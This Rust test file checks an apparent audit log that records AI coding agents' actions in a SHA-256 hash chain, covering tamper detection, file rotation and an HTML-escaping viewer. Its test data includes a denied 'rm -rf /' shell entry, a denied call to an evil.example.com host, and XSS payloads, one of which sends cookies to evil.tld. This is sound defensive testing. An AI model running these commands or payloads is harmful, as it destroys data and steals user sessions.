#![allow(unused_imports)]
use crate::prelude::*;

    // LEDGER-2.7-1
    #[test]
    fn test_append_only_jsonl_audit_store_persists_chained_sha256_entries_in_isolated_dir() {
        // 1. Validate isolated audit log directory resolution (%LOCALAPPDATA%\miku\audit)
        let isolated =
            resolve_isolated_audit_log_dir(Some(Path::new(r"C:\Users\cmiranda\AppData\Local")))
                .expect("resolve canonical Windows isolated audit dir");
        assert!(isolated.to_string_lossy().ends_with(r"miku\audit"));

        // Reject traversal, relative paths, and collisions with config/profiles/webview2
        assert!(matches!(
            format_canonical_windows_audit_log_dir(r"C:\Users\cmiranda\..\Admin\AppData\Local"),
            Err(UiError::AuditLogIoError(_))
        ));
        assert!(matches!(
            format_canonical_windows_audit_log_dir(r"C:\Users\cmiranda\AppData\Local\miku\config"),
            Err(UiError::AuditLogIoError(_))
        ));
        assert!(matches!(
            format_canonical_windows_audit_log_dir(
                r"C:\Users\cmiranda\AppData\Local\miku\webview2"
            ),
            Err(UiError::AuditLogIoError(_))
        ));

        // 2. Open persistent JSONL audit store in a dedicated temp dir, append entries, reopen & verify recovery
        let temp_dir = create_unique_isolated_audit_temp_dir("miku_test_27_1", 1).unwrap();

        let e1;
        let e2;
        {
            let mut store = PersistentJsonlAuditStore::open_default(&temp_dir)
                .expect("open fresh PersistentJsonlAuditStore");
            assert_eq!(store.next_seq(), 1);
            assert_eq!(store.last_entry_hash(), GENESIS_AUDIT_HASH);

            e1 = store
                .append_entry(
                    1_000,
                    "claude_code",
                    "fs_read",
                    "src/lib.rs",
                    "allow",
                    "ALLOW_RULE_MATCH",
                )
                .unwrap();
            assert_eq!(e1.seq, 1);
            assert_eq!(e1.prev_hash, GENESIS_AUDIT_HASH);

            e2 = store
                .append_entry(
                    1_050,
                    "cursor",
                    "shell",
                    "rm -rf /",
                    "deny",
                    "EXPLICIT_DENY_RULE",
                )
                .unwrap();
            assert_eq!(e2.seq, 2);
            assert_eq!(e2.prev_hash, e1.entry_hash);
        }

        // Reopen existing store on disk -> must recover next_seq = 3 and last_entry_hash = e2.entry_hash
        {
            let mut reopened = PersistentJsonlAuditStore::open_default(&temp_dir)
                .expect("reopen existing PersistentJsonlAuditStore");
            assert_eq!(reopened.next_seq(), 3);
            assert_eq!(reopened.last_entry_hash(), e2.entry_hash);

            let e3 = reopened
                .append_entry(
                    1_100,
                    "antigravity",
                    "network",
                    "https://evil.example.com",
                    "deny",
                    "DEFAULT_DENY_UNLISTED",
                )
                .unwrap();
            assert_eq!(e3.seq, 3);
            assert_eq!(e3.prev_hash, e2.entry_hash);

            let report = reopened.verify_persisted_chain().unwrap();
            assert_eq!(report.verified_entries, 3);
            assert_eq!(report.verified_files, 1);
            assert_eq!(report.first_seq, 1);
            assert_eq!(report.last_seq, 3);
            assert_eq!(report.anchor_prev_hash, GENESIS_AUDIT_HASH);
            assert_eq!(report.tip_entry_hash, e3.entry_hash);
        }

        let _ = fs::remove_dir_all(&temp_dir);
    }

    // LEDGER-2.7-2
    #[test]
    fn test_audit_log_verifier_detects_bit_flip_deletion_or_reordering_at_exact_line_under_50ms() {
        // Build a 10,000-entry chained JSONL buffer in memory and verify in < 50.0 ms (release)
        let mut log = TamperEvidentAuditLog::new();
        for i in 0..10_000 {
            log.append(
                100_000 + (i as u64),
                "claude_code",
                "fs_write",
                "src/main.rs",
                "allow",
                "INTERACTIVE_USER_APPROVED",
            );
        }
        let raw_10k = log.export_jsonl();

        let report = PersistentJsonlAuditStore::verify_single_jsonl_str(
            ACTIVE_AUDIT_JSONL_FILENAME,
            &raw_10k,
            GENESIS_AUDIT_HASH,
            1,
        )
        .expect("10,000-entry chain must verify cleanly");
        assert_eq!(report.verified_entries, 10_000);
        assert_eq!(report.first_seq, 1);
        assert_eq!(report.last_seq, 10_000);

        let max_limit_ms = if cfg!(debug_assertions) {
            500.0
        } else {
            MAX_10K_VERIFY_LATENCY_MS
        };
        assert!(
            report.elapsed_ms < max_limit_ms,
            "10k verify latency {:.3} ms exceeded limit {:.1} ms",
            report.elapsed_ms,
            max_limit_ms
        );

        let base_lines: Vec<&str> = raw_10k.lines().collect();
        assert_eq!(base_lines.len(), 10_000);

        // Case A: 1-bit / 1-field tampering at exact line index 4321 ("allow" -> "deny")
        let mut bit_flip_lines: Vec<String> = base_lines.iter().map(|s| (*s).to_string()).collect();
        bit_flip_lines[4321] = bit_flip_lines[4321].replace("\"allow\"", "\"deny\"");
        let bit_flip_jsonl = bit_flip_lines.join("\n");
        match PersistentJsonlAuditStore::verify_single_jsonl_str(
            ACTIVE_AUDIT_JSONL_FILENAME,
            &bit_flip_jsonl,
            GENESIS_AUDIT_HASH,
            1,
        ) {
            Err(UiError::AuditLogTamperDetected(diag)) => {
                assert_eq!(diag.corrupted_line_index, 4321);
                assert_eq!(diag.expected_seq, 4322);
                assert_eq!(diag.found_seq, Some(4322));
                assert!(diag.reason.contains("entry_hash cryptographic mismatch"));
            }
            other => panic!("expected AuditLogTamperDetected at line 4321, got {:?}", other),
        }

        // Case B: Line deletion at exact line index 1500
        let mut deleted_lines: Vec<&str> = base_lines.clone();
        deleted_lines.remove(1500);
        let deleted_jsonl = deleted_lines.join("\n");
        match PersistentJsonlAuditStore::verify_single_jsonl_str(
            ACTIVE_AUDIT_JSONL_FILENAME,
            &deleted_jsonl,
            GENESIS_AUDIT_HASH,
            1,
        ) {
            Err(UiError::AuditLogTamperDetected(diag)) => {
                assert_eq!(diag.corrupted_line_index, 1500);
                assert_eq!(diag.expected_seq, 1501);
                assert_eq!(diag.found_seq, Some(1502));
            }
            other => panic!("expected AuditLogTamperDetected at line 1500, got {:?}", other),
        }

        // Case C: Line reordering (swap line 800 and 801)
        let mut swapped_lines: Vec<&str> = base_lines;
        swapped_lines.swap(800, 801);
        let swapped_jsonl = swapped_lines.join("\n");
        match PersistentJsonlAuditStore::verify_single_jsonl_str(
            ACTIVE_AUDIT_JSONL_FILENAME,
            &swapped_jsonl,
            GENESIS_AUDIT_HASH,
            1,
        ) {
            Err(UiError::AuditLogTamperDetected(diag)) => {
                assert_eq!(diag.corrupted_line_index, 800);
                assert_eq!(diag.expected_seq, 801);
                assert_eq!(diag.found_seq, Some(802));
            }
            other => panic!("expected AuditLogTamperDetected at line 800, got {:?}", other),
        }
    }

    // LEDGER-2.7-3
    #[test]
    fn test_transactional_size_rotation_preserves_cross_file_sha256_hash_continuity() {
        let temp_dir = create_unique_isolated_audit_temp_dir("miku_test_27_3", 3).unwrap();

        // Configure 1,100-byte max_file_bytes (3 entries per segment) and max_rotated_files = 3
        // Appending 14 entries triggers 4 rotations: the oldest 3-entry segment is evicted,
        // leaving 11 surviving entries (seq 4..=14) across audit.3.jsonl, audit.2.jsonl, audit.1.jsonl, and audit.jsonl.
        let mut store =
            PersistentJsonlAuditStore::open(&temp_dir, 1_100, 3).expect("open rotating store");

        for i in 0..14 {
            store
                .append_entry(
                    10_000 + (i as u64) * 10,
                    "claude_code",
                    "shell",
                    &format!("cargo test --step-{}", i),
                    "allow",
                    "ALLOW_RULE_MATCH",
                )
                .unwrap();
        }

        assert!(
            store.rotations_completed() >= 2,
            "expected >= 2 rotations, got {}",
            store.rotations_completed()
        );
        assert!(store.rotated_file_path(1).exists());
        assert!(store.rotated_file_path(2).exists());
        assert!(store.active_file_path().exists());

        // Verify cross-file hash continuity across all surviving segments (`audit.3.jsonl -> ... -> audit.jsonl`)
        let report = store
            .verify_persisted_chain()
            .expect("rotated multi-file chain must verify seamlessly");
        assert_eq!(report.verified_entries, 11);
        assert!(report.verified_files >= 3);
        assert_eq!(report.first_seq, 4);
        assert_eq!(report.last_seq, 14);

        // Also test reopening the rotated directory from scratch and verifying continuity
        let reopened =
            PersistentJsonlAuditStore::open(&temp_dir, 1_100, 3).expect("reopen rotated store");
        let reopened_report = reopened.verify_persisted_chain().unwrap();
        assert_eq!(reopened_report.verified_entries, 11);
        assert_eq!(reopened_report.first_seq, 4);
        assert_eq!(reopened_report.last_seq, 14);

        let _ = fs::remove_dir_all(&temp_dir);
    }

    // LEDGER-2.7-4
    #[test]
    fn test_safe_webview_audit_viewer_neutralizes_xss_payloads_and_paginates_entries() {
        let temp_dir = create_unique_isolated_audit_temp_dir("miku_test_27_4", 4).unwrap();

        let mut store = PersistentJsonlAuditStore::open_default(&temp_dir).unwrap();
        for i in 0..65 {
            let target = if i == 0 {
                "<script>fetch('https://evil.tld/steal?cookie='+document.cookie)</script>"
                    .to_string()
            } else {
                format!("src/module_{}.rs <img src=x onerror=alert({})>", i, i)
            };
            let verdict = if i % 2 == 0 { "deny" } else { "allow" };
            store
                .append_entry(
                    20_000 + (i as u64),
                    "claude_code",
                    "fs_write",
                    &target,
                    verdict,
                    "XSS_AUDIT_TEST",
                )
                .unwrap();
        }

        // Request page 0 with size 100 -> must clamp to MAX_AUDIT_VIEWER_PAGE_SIZE (50)
        let page0 = SafeWebViewAuditViewer::render_page(
            &store,
            &AuditViewerFilter::default(),
            0,
            100,
        )
        .unwrap();
        assert_eq!(page0.page_size, MAX_AUDIT_VIEWER_PAGE_SIZE);
        assert_eq!(page0.total_matching_entries, 65);
        assert_eq!(page0.total_pages, 2);
        assert_eq!(page0.rows.len(), 50);
        assert!(page0.chain_integrity_verified);

        if let WebViewIpcPayloadV1::DomSafeTextRender {
            ref safe_text,
            csp_enforced,
            ..
        } = page0.rows[0].target_cell
        {
            assert!(csp_enforced);
            assert!(!safe_text.contains("<script>"));
            assert!(safe_text.contains("&lt;script&gt;"));
        } else {
            panic!("expected DomSafeTextRender in viewer target_cell");
        }

        // Request page 1 -> remaining 15 rows
        let page1 = SafeWebViewAuditViewer::render_page(
            &store,
            &AuditViewerFilter::default(),
            1,
            50,
        )
        .unwrap();
        assert_eq!(page1.rows.len(), 15);

        // Filtered query for verdict == "deny" (33 matching entries out of 65)
        let deny_filter = AuditViewerFilter {
            agent_exact: Some("claude_code".to_string()),
            verdict_exact: Some("deny".to_string()),
            query_substring: None,
        };
        let filtered_page =
            SafeWebViewAuditViewer::render_page(&store, &deny_filter, 0, 50).unwrap();
        assert_eq!(filtered_page.total_matching_entries, 33);

        // Corrupt line 2 on disk and verify SafeWebViewAuditViewer flags chain_integrity_verified = false
        let raw = fs::read_to_string(store.active_file_path()).unwrap();
        let mut lines: Vec<String> = raw.lines().map(|s| s.to_string()).collect();
        lines[2] = lines[2].replace("\"deny\"", "\"forged_allow\"");
        fs::write(store.active_file_path(), lines.join("\n") + "\n").unwrap();

        let tampered_page = SafeWebViewAuditViewer::render_page(
            &store,
            &AuditViewerFilter::default(),
            0,
            10,
        )
        .unwrap();
        assert!(!tampered_page.chain_integrity_verified);
        if let WebViewIpcPayloadV1::DomSafeTextRender { ref safe_text, .. } =
            tampered_page.integrity_status_badge
        {
            assert!(safe_text.contains("TAMPER_DETECTED_LINE_2"));
        } else {
            panic!("expected DomSafeTextRender for integrity_status_badge");
        }

        let _ = fs::remove_dir_all(&temp_dir);
    }

